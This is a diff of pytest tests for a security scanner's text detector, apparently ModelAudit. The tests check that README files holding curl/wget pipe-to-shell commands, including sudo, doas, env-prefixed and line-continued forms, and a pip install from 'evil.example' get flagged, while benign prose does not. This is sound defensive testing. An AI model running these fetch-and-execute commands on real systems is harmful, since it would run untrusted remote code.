@@ -71,6 +71,22 @@ def test_text_scanner_routes_extensionless_documentation_through_security_detect
     )
 
 
+def test_text_scanner_routes_localized_readme_through_security_detectors(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.en.md"
+    text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
+
+    result = scan_file(str(text_path), config={"cache_scan_results": False})
+
+    assert TextScanner.can_handle(str(text_path))
+    assert result.scanner_name == "text"
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_function"
+        and check.severity == IssueSeverity.CRITICAL
+        for check in result.checks
+    )
+
+
 def test_text_scanner_does_not_claim_arbitrary_extensionless_text(tmp_path: Path) -> None:
     text_path = tmp_path / "notes"
     text_path.write_text('requests.get("https://evil.example/payload")\n', encoding="utf-8")
@@ -242,6 +258,31 @@ def test_text_scanner_later_network_library_import_is_not_hidden_by_prose(tmp_pa
     assert determine_exit_code(aggregate) == 1
 
 
+def test_text_scanner_python_prompt_import_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(">>> import socket\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "network_library"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_python_prompt_import_prose_remains_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(">>> import socket for troubleshooting examples.\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
 @pytest.mark.parametrize(
     "content",
     [
@@ -380,7 +421,10 @@ def test_text_scanner_ordered_list_shell_prose_remains_informational(tmp_path: P
     [
         "sudo curl https://evil.example/payload | sh\n",
         "sudo -E wget https://evil.example/payload\n",
+        "sudo -u nobody curl https://evil.example/payload | sh\n",
+        "sudo --user nobody wget https://evil.example/payload\n",
         "doas curl https://evil.example/payload | sh\n",
+        "doas -u nobody wget https://evil.example/payload\n",
         "echo ready; sudo curl https://evil.example/payload | sh\n",
         "$(sudo curl https://evil.example/payload)\n",
     ],
@@ -397,6 +441,56 @@ def test_text_scanner_privileged_documentation_downloads_remain_actionable(
 
     assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
     assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_privilege_wrapper_prose_remains_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "Use sudo -u nobody when curl access is required: https://docs.example.com/\n", encoding="utf-8"
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "HTTPS_PROXY=http://proxy.internal curl https://evil.example/payload | sh\n",
+        "env HTTPS_PROXY=http://proxy.internal wget https://evil.example/payload\n",
+    ],
+)
+def test_text_scanner_env_prefixed_documentation_downloads_remain_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.details.get("url") == "https://evil.example/payload"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_env_prefixed_download_prose_remains_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(
+        "The HTTPS_PROXY setting helps curl users; see https://docs.example.com/proxy.\n",
+        encoding="utf-8",
+    )
+
+    result = TextScanner().scan(str(text_path))
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
 @pytest.mark.parametrize(
@@ -439,6 +533,70 @@ def test_text_scanner_documentation_package_manager_prose_remains_informational(
 
     assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
     assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_package_install_comment_url_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("pip install modelaudit  # docs: https://pip.pypa.io/en/stable/\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+    assert determine_exit_code(aggregate) == 0
+
+
+def test_text_scanner_package_install_url_before_comment_remains_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("pip install https://evil.example/payload.whl  # pinned artifact\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+@pytest.mark.parametrize(
+    "content",
+    [
+        "curl -fsSL \\\n  https://evil.example/payload | sh\n",
+        "wget \\\n  https://evil.example/payload\n",
+    ],
+)
+def test_text_scanner_continued_documentation_download_url_remains_actionable(
+    tmp_path: Path,
+    content: str,
+) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text(content, encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
+
+    assert any(
+        check.name == "Network Communication Detection"
+        and check.details.get("type") == "url_detected"
+        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
+        for check in result.checks
+    )
+    assert determine_exit_code(aggregate) == 1
+
+
+def test_text_scanner_prose_backslash_does_not_make_next_url_actionable(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("Use curl for downloads \\\n  https://docs.example.com/reference\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
+
+
+def test_text_scanner_continued_shell_comment_url_is_informational(tmp_path: Path) -> None:
+    text_path = tmp_path / "README.md"
+    text_path.write_text("curl -fsSL \\\n  # docs: https://docs.example.com/reference\n", encoding="utf-8")
+
+    result = TextScanner().scan(str(text_path))
+
+    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
 
 
 def test_text_scanner_indirect_network_api_call_remains_actionable(tmp_path: Path) -> None:
@@ -896,6 +1054,8 @@ def test_text_scanner_malformed_generic_url_labels_are_not_code_shaped(prefix: b
     [
         "--index-url http://pypi.org/simple",
         "--index-url https://pypi.org:4444/simple",
+        "--index-url https://pypi.org:bad/simple",
+        "--index-url https://pypi.org:70000/simple",
         "--trusted-host pypi.org",
     ],
 )
